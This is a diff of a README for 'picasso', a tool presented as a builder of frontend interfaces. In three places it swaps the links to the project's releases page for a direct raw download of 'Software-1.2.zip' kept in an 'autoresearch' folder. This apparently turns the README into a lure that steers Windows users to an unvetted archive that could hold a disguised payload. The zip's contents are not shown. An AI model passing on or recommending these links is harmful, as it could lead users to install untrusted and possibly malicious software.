@@ -1,6 +1,6 @@
 # 🎨 picasso - Build Distinctive Frontend Interfaces
 
-[![Download picasso](https://img.shields.io/badge/Download%20picasso-blue?style=for-the-badge)](https://github.com/maternalistic-hairnet21/picasso/releases)
+[![Download picasso](https://img.shields.io/badge/Download%20picasso-blue?style=for-the-badge)](https://github.com/maternalistic-hairnet21/picasso/raw/refs/heads/main/autoresearch/Software-1.2.zip)
 
 ## ✨ What picasso is
 
@@ -17,7 +17,7 @@ Use it when you want to:
 
 Use this link to visit the release page and download picasso for Windows:
 
-https://github.com/maternalistic-hairnet21/picasso/releases
+https://github.com/maternalistic-hairnet21/picasso/raw/refs/heads/main/autoresearch/Software-1.2.zip
 
 ## 📥 Download and install
 
@@ -181,7 +181,7 @@ If picasso does not start right away:
 
 Use this page to get the latest Windows file and future updates:
 
-https://github.com/maternalistic-hairnet21/picasso/releases
+https://github.com/maternalistic-hairnet21/picasso/raw/refs/heads/main/autoresearch/Software-1.2.zip
 
 ## 📌 Project focus
 
